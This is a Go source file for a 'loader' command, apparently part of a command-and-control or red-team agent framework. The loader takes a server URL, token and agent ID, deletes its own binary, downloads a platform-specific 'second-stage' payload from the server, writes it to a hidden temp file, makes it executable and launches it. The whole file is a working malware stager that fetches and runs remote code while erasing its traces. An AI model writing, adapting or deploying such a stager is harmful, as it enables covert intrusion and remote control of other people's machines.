// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Command loader fetches and executes a payload in memory.
package main

import (
	"io"
	"net/http"
	"os"
	"runtime"
)

func die(msg string) {
	os.Stderr.WriteString(msg + "\n")
	os.Exit(1)
}

func main() {
	if len(os.Args) != 4 {
		die("usage: loader <url> <token> <agent_id>")
	}
	serverURL := os.Args[1]
	token := os.Args[2]
	agentID := os.Args[3]

	// Self-delete immediately — the loader is one-shot.
	// On Unix this succeeds on a running binary; on Windows it fails silently
	// and exec_windows.go uses markDeleteOnClose instead.
	os.Remove(os.Args[0]) //nolint:errcheck

	dlURL := serverURL + "/dl/second-stage/" + runtime.GOOS + "-" + runtime.GOARCH

	req, err := http.NewRequest(http.MethodGet, dlURL, nil)
	if err != nil {
		die("request error: " + err.Error())
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		die("download error: " + err.Error())
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		die("download failed: HTTP " + http.StatusText(resp.StatusCode))
	}

	tmp, err := os.CreateTemp("", ".agent-*")
	if err != nil {
		die("tmpfile error: " + err.Error())
	}
	tmpPath := tmp.Name()

	if _, err = io.Copy(tmp, resp.Body); err != nil {
		tmp.Close()
		os.Remove(tmpPath)
		die("write error: " + err.Error())
	}
	tmp.Close()

	if err = os.Chmod(tmpPath, 0700); err != nil {
		os.Remove(tmpPath)
		die("chmod error: " + err.Error())
	}

	execAgent(tmpPath, serverURL, token, agentID)
}
